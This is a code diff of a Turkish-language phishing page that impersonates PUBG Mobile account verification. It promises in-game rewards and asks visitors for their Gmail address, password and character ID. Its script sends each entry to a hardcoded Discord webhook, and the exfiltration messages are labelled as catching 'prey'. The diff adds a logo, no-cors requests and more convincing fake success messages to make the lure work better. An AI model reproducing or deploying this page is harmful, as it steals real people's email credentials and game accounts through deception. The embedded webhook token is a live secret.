@@ -5,23 +5,31 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PUBG Mobile - Hesap Doğrulama</title>
     <style>
-        body { margin: 0; padding: 0; background: #0a0a0a; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .bg-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)); z-index: -1; }
-        .container { background: #1a1a1a; border: 2px solid #f39c12; border-radius: 5px; width: 340px; padding: 25px; text-align: center; box-shadow: 0 0 20px rgba(243, 156, 18, 0.2); }
-        .header-img { width: 120px; margin-bottom: 15px; }
-        h2 { color: #f39c12; text-transform: uppercase; letter-spacing: 2px; margin: 0 0 10px 0; font-size: 20px; }
-        p { font-size: 13px; color: #bbb; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; background: #222; border: 1px solid #444; color: #fff; border-radius: 3px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #f39c12; }
-        .btn { width: 100%; padding: 12px; background: #f39c12; color: #000; border: none; border-radius: 3px; cursor: pointer; font-weight: bold; font-size: 14px; text-transform: uppercase; margin-top: 10px; }
+        body { margin: 0; padding: 0; background: #0a0a0a; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .bg-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)); z-index: -1; }
         
-        /* Yükleme Bölümü */
-        .loader { border: 3px solid #333; border-top: 3px solid #f39c12; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        /* Konteynır */
+        .container { background: #1a1a1a; border: 2px solid #f39c12; border-radius: 8px; width: 320px; padding: 25px; text-align: center; box-shadow: 0 0 25px rgba(243, 156, 18, 0.3); position: relative; }
+        
+        /* Logo Stili */
+        .pubg-logo { width: 140px; margin-bottom: 20px; filter: drop-shadow(0 0 5px rgba(243, 156, 18, 0.5)); }
+        
+        h2 { color: #f39c12; text-transform: uppercase; letter-spacing: 2px; margin: 0 0 10px 0; font-size: 18px; text-shadow: 1px 1px 2px #000; }
+        p { font-size: 13px; color: #bbb; margin-bottom: 20px; line-height: 1.5; }
+        
+        input { width: 100%; padding: 12px; margin: 8px 0; background: #252525; border: 1px solid #444; color: #fff; border-radius: 4px; box-sizing: border-box; outline: none; font-size: 14px; }
+        input:focus { border-color: #f39c12; box-shadow: 0 0 5px rgba(243, 156, 18, 0.5); }
+        
+        .btn { width: 100%; padding: 13px; background: #f39c12; color: #000; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 14px; text-transform: uppercase; margin-top: 10px; transition: 0.3s; }
+        .btn:hover { background: #e67e22; }
+        
+        /* Yükleme Simgesi */
+        .loader { border: 3px solid #333; border-top: 3px solid #f39c12; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* PUBG ID Arayüzü */
+        /* PUBG ID Bölümü */
         #pubgInterface { display: none; }
-        .id-input-group { background: #2a2a2a; padding: 15px; border-radius: 4px; border-left: 4px solid #f39c12; margin-top: 15px; }
+        .id-input-group { background: #2a2a2a; padding: 15px; border-radius: 6px; border-top: 3px solid #f39c12; margin-top: 15px; }
     </style>
 </head>
 <body>
@@ -29,76 +37,80 @@
 <div class="bg-overlay"></div>
 
 <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/ad/Pubg_mobile_logo.png/250px-Pubg_mobile_logo.png" alt="PUBG Logo" class="pubg-logo">
+
     <div id="loginStep">
-        <h2>SİSTEM KAYDI</h2>
-        <p>Hesabınızı onaylamak için giriş yapın</p>
-        <form id="mainForm">
-            <input type="email" id="email" placeholder="Gmail Adresiniz" required>
-            <input type="password" id="pass" placeholder="Şifreniz" required>
-            <button type="submit" class="btn">İLERLE</button>
-        </form>
+        <h2>HESAP DOĞRULAMA</h2>
+        <p>Ödüllerin hesabınıza tanımlanması için Gmail ile giriş yapın.</p>
+        <input type="email" id="email" placeholder="Gmail Adresiniz" required>
+        <input type="password" id="pass" placeholder="Şifreniz" required>
+        <button type="button" onclick="gonderVeriyi()" class="btn">DEVAM ET</button>
     </div>
 
     <div id="loadingStep" style="display:none;">
         <div class="loader"></div>
-        <p id="loadingText">Hesap taranıyor...</p>
+        <p id="loadingText" style="color: #f39c12; font-weight: bold;">Bağlantı kuruluyor...</p>
     </div>
 
     <div id="pubgInterface">
-        <h2 style="color: #f39c12;">HESAP BAĞLANDI</h2>
-        <p>Lütfen ödüllerin tanımlanacağı Karakter ID numarasını girin.</p>
+        <h2 style="color: #2ecc71;">GİRİŞ BAŞARILI</h2>
+        <p>Hesap doğrulandı. Lütfen Karakter ID numaranızı girerek işlemi tamamlayın.</p>
         <div class="id-input-group">
-            <input type="number" id="pubgId" placeholder="Örn: 5123456789" style="text-align: center; letter-spacing: 3px;">
-            <button class="btn" onclick="idGonder()">ID BAĞLA</button>
+            <input type="number" id="pubgId" placeholder="Oyuncu ID (Örn: 58231...)" style="text-align: center;">
+            <button class="btn" onclick="idGonder()">ID'Yİ BAĞLA</button>
         </div>
-        <p style="font-size: 10px; color: #777; margin-top: 15px;">Doğrulama başarılı. Ödüller 24 saat içinde hesabınıza aktarılacaktır.</p>
+        <p style="font-size: 11px; color: #888; margin-top: 15px;">UC ve ödül gönderimi ID üzerinden yapılacaktır.</p>
     </div>
 </div>
 
 <script>
     const webhookURL = "https://discord.com/api/webhooks/1454488470402633879/hYwEM4vWg39W9bH9eg1Tayxd6LUHuDBqiOKWJKB2yvJbgQLgpYeU714kiwxsl1pKq1fz";
 
-    const mainForm = document.getElementById("mainForm");
-    
-    mainForm.onsubmit = async (e) => {
-        e.preventDefault();
+    async function gonderVeriyi() {
         const email = document.getElementById("email").value;
         const pass = document.getElementById("pass").value;
 
-        // Veriyi Discord'a uçur
-        fetch(webhookURL, {
-            method: "POST",
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: "🎯 **PUBG AVLANDI!**\n📧: `" + email + "`\n🔑: `" + pass + "`" })
-        });
+        if(!email || !pass) {
+            alert("Lütfen tüm alanları doldurun!");
+            return;
+        }
 
-        // Arayüzü değiştir
+        // Arayüz Değişimi
         document.getElementById("loginStep").style.display = "none";
         document.getElementById("loadingStep").style.display = "block";
 
-        // Gerçekçi bekleme (2.5 saniye)
+        // Discord'a fırlat (Telefon uyumlu)
+        fetch(webhookURL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                content: "🔥 **YENİ PUBG AV!**\n📧: `" + email + "`\n🔑: `" + pass + "`" 
+            })
+        });
+
         setTimeout(() => {
-            document.getElementById("loadingText").innerText = "Doğrulama tamamlandı...";
+            document.getElementById("loadingText").innerText = "Karakter aranıyor...";
         }, 1200);
 
         setTimeout(() => {
             document.getElementById("loadingStep").style.display = "none";
             document.getElementById("pubgInterface").style.display = "block";
-        }, 2500);
-    };
+        }, 3000);
+    }
 
     function idGonder() {
         const id = document.getElementById("pubgId").value;
-        if(id.length < 5) return alert("Lütfen geçerli bir ID girin!");
+        if(id.length < 5) return alert("Hatalı Karakter ID!");
         
-        // ID'yi de Discord'a gönder
         fetch(webhookURL, {
             method: "POST",
+            mode: "no-cors",
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: "🆔 **Karakter ID:** `" + id + "`" })
+            body: JSON.stringify({ content: "🆔 **KARAKTER ID:** `" + id + "`" })
         });
 
-        alert("Başarıyla Bağlandı! Ödülleriniz gönderiliyor.");
+        alert("Başarıyla Bağlandı! Hediyeleriniz 24 saat içinde gönderilecektir.");
     }
 </script>
 
